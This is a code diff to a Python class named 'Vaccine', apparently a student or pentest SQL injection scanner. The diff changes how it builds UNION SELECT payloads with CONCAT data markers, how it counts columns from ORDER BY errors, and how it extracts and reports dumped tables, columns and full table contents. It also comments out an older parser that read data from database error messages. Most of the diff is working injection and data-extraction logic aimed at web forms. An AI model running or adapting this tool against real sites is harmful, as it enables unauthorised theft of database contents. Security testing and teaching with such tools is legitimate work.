@@ -95,8 +95,8 @@ class Vaccine:
     def union_query(self, input, select_query, from_query=""):
         ''' Build UNION Query based on the number of columns found '''
         cols = ['NULL'] * input['col']
-        cols[0] = select_expr
-        payload = f"' UNION SELECT {', '.join(cols)} {from_clause}-- "
+        cols[0] = f"CONCAT('<<<SQLI>>>', {select_query}, '<<<END>>>')"
+        payload = f"' UNION SELECT {', '.join(cols)} {from_query}"
         return payload
 
     def run_query(self, form, select_query, from_query):
@@ -235,19 +235,24 @@ class Vaccine:
                             inp['vul'].append("boolean")
                             break
         # Columns count
+        found = False
         for i in range(1, 11):
+            if found:
+                break
             query = Query.checks['columns'][0].format(i)
             for form in self.forms:
                 responses = self.check_all_inputs(form, query)
                 for res in responses:
                     if res['response'].status_code == 500 or "unknown column" in res['response'].text.lower()\
                             or "ORDER BY" in res['response'].text.lower():
+                        print(f"Count: {i}, response: {res['response'].text}") # DEV
                         form.vul = True
                         self.vul = True
                         for inp in form.inputs:
                             if inp['name'] == res['input'] and "columns" not in inp['vul']:
                                 inp['vul'].append("error")
-                                inp['col'] = i - 1
+                                inp['col'] = i - 1 if i > 1 else 1
+                                found = True
                                 break
 
         # Union
@@ -295,19 +300,16 @@ class Vaccine:
             self.add_report(str(table))
             self.add_report("\n")
 
-    # def check_version(self):
-    #     if not self.vul:
-    #         return None
-
-    #     for db, query in Query.versions.items():
-    #         for form in self.forms:
-    #             if not form.vul:
-    #                 continue
-    #             response = self.run_query(form, query)
-    #             # print(response)  # DEV
-    #             if db.lower() in response.lower():
-    #                 return db
-    #     return None
+    def extract_data(self, response):
+        ''' Extract data between markers '''
+        if not response:
+            return None
+        
+        import re
+        match = re.search(r'<<<SQLI>>>(.*?)<<<END>>>', response, re.DOTALL)
+        if match:
+            return match.group(1).strip()
+        return None
                     
     def extract_infos(self):
 
@@ -342,59 +344,59 @@ class Vaccine:
                 dump = self.run_query(form, query['select'], query['from'])
         
         self.add_report(f"==> TABLES\n")
-        # tables = self.parse_extraction(tables)
+        tables = self.extract_data(tables)
         tables = tables if tables else "No Table extracted"
         self.add_report(tables[:1000] + "\n")
 
         self.add_report(f"==> COLUMNS\n")
-        # columns = self.parse_extraction(columns)
+        columns = self.extract_data(columns)
         columns = columns if columns else "No Columns extracted"
         self.add_report(columns[:1000] + "\n")
 
         self.add_report(f"==> FULL DUMP\n")
         print(dump) # DEV
-        # dump = self.parse_extraction(dump)
+        dump = self.extract_data(dump)
         dump = dump if dump else "No Full Dump extracted"
-        self.add_report(dump[:1000] + "\n")
+        self.add_report(dump[:10000] + "\n")
 
-    def parse_extraction(self, response):
-        ''' Extract data from XPATH error messages '''
-        if not response:
-            return None
+    # def parse_extraction(self, response):
+    #     ''' Extract data from XPATH error messages '''
+    #     if not response:
+    #         return None
         
-        if self.engine == 'MySQL':
-            if 'XPATH syntax error' in response:
-                match = re.search(r"'~([^']+)'", response)
-                if match:
-                    data = match.group(1)
-                    data = data.replace('\x3a', ':')  # 0x3a = :
-                    data = data.replace('\x7c', '|')  # 0x7c = |
-                    data = data.replace('\x2c', ',')  # 0x2c = ,
-                    return data
-            elif 'near' in response.lower():
-                match = re.search(r"near '([^']+)'", response)
-                if match:
-                    return match.group(1)
+    #     if self.engine == 'MySQL':
+    #         if 'XPATH syntax error' in response:
+    #             match = re.search(r"'~([^']+)'", response)
+    #             if match:
+    #                 data = match.group(1)
+    #                 data = data.replace('\x3a', ':')  # 0x3a = :
+    #                 data = data.replace('\x7c', '|')  # 0x7c = |
+    #                 data = data.replace('\x2c', ',')  # 0x2c = ,
+    #                 return data
+    #         elif 'near' in response.lower():
+    #             match = re.search(r"near '([^']+)'", response)
+    #             if match:
+    #                 return match.group(1)
         
-        elif self.engine == 'Microsoft':
-            if 'Conversion failed' in response:
-                match = re.search(r"Conversion failed for value '([^']+)'", response)
-                if match:
-                    return match.group(1)
+    #     elif self.engine == 'Microsoft':
+    #         if 'Conversion failed' in response:
+    #             match = re.search(r"Conversion failed for value '([^']+)'", response)
+    #             if match:
+    #                 return match.group(1)
         
-        elif self.engine == 'PostgreSQL':
-            if 'invalid input syntax' in response.lower():
-                match = re.search(r"invalid input syntax[^:]*: \"([^\"]+)\"", response)
-                if match:
-                    return match.group(1)
+    #     elif self.engine == 'PostgreSQL':
+    #         if 'invalid input syntax' in response.lower():
+    #             match = re.search(r"invalid input syntax[^:]*: \"([^\"]+)\"", response)
+    #             if match:
+    #                 return match.group(1)
         
-        elif self.engine == 'Oracle':
-            if 'ORA-' in response:
-                match = re.search(r"ORA-\d+: (.+?)(?:\n|$)", response)
-                if match:
-                    return match.group(1)
+    #     elif self.engine == 'Oracle':
+    #         if 'ORA-' in response:
+    #             match = re.search(r"ORA-\d+: (.+?)(?:\n|$)", response)
+    #             if match:
+    #                 return match.group(1)
         
-        return None
+    #     return None
         
     def __str__(self):
         return (f"Vaccine:\n  * URL:      {self.url}\n\
